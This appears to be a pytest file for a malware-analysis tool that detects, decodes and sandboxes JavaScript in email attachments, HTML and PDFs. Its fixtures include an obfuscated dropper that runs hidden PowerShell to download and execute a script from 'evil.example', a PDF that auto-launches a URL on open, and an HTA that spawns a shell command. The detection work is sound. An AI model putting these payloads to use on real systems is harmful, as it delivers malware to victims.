"""JavaScript block: extraction from every family, static analysis, STPyV8 sandbox."""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

import pdfkit as pk  # noqa: E402

from docutracex.config import settings  # noqa: E402
from docutracex.parsers import javascript, pdf  # noqa: E402

DROPPER = """var _0x1a = ['\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f', 'evil.example/s.ps1'];
eval(unescape('%76%61%72%20%73%68%3d%6e%65%77%20%41%63%74%69%76%65%58%4f%62%6a%65%63%74%28%27%57%53%63%72%69%70%74%2e%53%68%65%6c%6c%27%29%3b'));
sh.Run('powershell -w hidden -c iwr ' + _0x1a[0] + _0x1a[1] + ' | iex', 0);"""


def _rules(res):
    return {f["rule"] for f in res["findings"]}




def _have_v8() -> bool:
    try:
        import STPyV8  # noqa: F401
        return True
    except Exception:  # noqa: BLE001
        return False


v8 = pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")


@v8
def test_sandbox_unfolds_layers_and_records_the_command() -> None:
    sb = javascript.sandbox(DROPPER)
    names = [(e["kind"], e["name"]) for e in sb["log"]]
    # gmzpt
    assert ("layer", "eval") in names and ("activex", "new ActiveXObject") in names
    run = next(e for e in sb["log"] if e["name"] == "WScript.Shell.Run")
    assert "http://evil.example/s.ps1" in run["args"][0]


@v8
def test_sandbox_keeps_the_log_of_an_endless_script() -> None:
    sb = javascript.sandbox("app.launchURL('http://203.0.113.9/x'); while (true) {}")
    assert sb["timed_out"] and any(e["name"] == "app.launchURL" for e in sb["log"])


def test_scripts_from_html() -> None:
    html = """<script>var a = 1;</script><script src="https://cdn.example.com/x.js"></script>
    <script language="VBScript">MsgBox 1</script><body onload="go()"><a href="javascript:steal()">x</a>"""
    scripts = javascript.scripts_from_html(html)
    assert scripts[0].strip() == "var a = 1;"
    assert "go()" in scripts[-1] and "steal()" in scripts[-1]
    assert not any("MsgBox" in s for s in scripts)


def test_static_analysis_and_decoding() -> None:
    hits = {h["rule"] for h in javascript.static_hits(DROPPER)}
    assert {"js_eval", "js_unescape", "js_wscript_shell", "js_lolbin"} <= hits
    dec = javascript.decode_strings(DROPPER + "\nvar q = String.fromCharCode(104,116,116,112,58,47,47);")
    assert any("WScript.Shell" in d["decoded"] for d in dec) and any(d["decoded"] == "http://" for d in dec)
    assert javascript.metrics("var a=1;")["obfuscation_score"] == 0


def test_collect_from_extracted_files(tmp_path: Path) -> None:
    ex = tmp_path / "case" / "extracted"
    (ex / "attachments").mkdir(parents=True)
    (ex / "attachments" / "00_pago.js").write_text(DROPPER)
    (ex / "attachments" / "01_f.hta").write_text("<script>new ActiveXObject('WScript.Shell').Run('calc')</script>")
    (ex / "attachments" / "02_r.wsf").write_text('<job><script language="JScript">WScript.Echo(1)</script></job>')
    (ex / "attachments" / "03_photo.png").write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 100)
    items = javascript.collect(tmp_path / "orig.eml", ex, {})
    kinds = sorted(i["kind"] for i in items)
    assert kinds == ["hta", "jscript/js", "wsf-jscript"]


@pytest.mark.skipif(not (settings.tools_dir / "didier" / "decode-vbe.py").is_file(), reason="decode-vbe not provisioned")
def test_jse_is_decoded(tmp_path: Path) -> None:
    ex = tmp_path / "extracted"
    ex.mkdir()
    (ex / "a.jse").write_text('#@~^DgAAAA==\\ko$K6,JCV^GJqAQAAA==^#~@')
    items = javascript.collect(tmp_path / "x.eml", ex, {})
    assert items and items[0]["kind"] == "jscript-encoded" and "MsgBox" in items[0]["code"]


@v8
def test_pdf_javascript_in_a_stream(tmp_path: Path) -> None:
    b = pk.PdfBuilder()
    js = b.stream(b"app.launchURL('http://203.0.113.9/p', true);", compress=True)
    action = b.add(f"<< /S /JavaScript /JS {js} 0 R >>")
    pages = b.add("<< /Type /Pages /Kids [] /Count 0 >>")
    root = b.add(f"<< /Type /Catalog /Pages {pages} 0 R /OpenAction {action} 0 R >>")
    p = tmp_path / "s.pdf"
    p.write_bytes(b.build(root))
    res = javascript.analyze(p, tmp_path / "extracted", {"pdf": pdf.analyze(p)})
    assert res["scripts"] and res["scripts"][0]["origin"] == "PDF /JS stream"
    assert {"pdf_js_launch_url", "js_sandbox_network"} <= _rules(res)
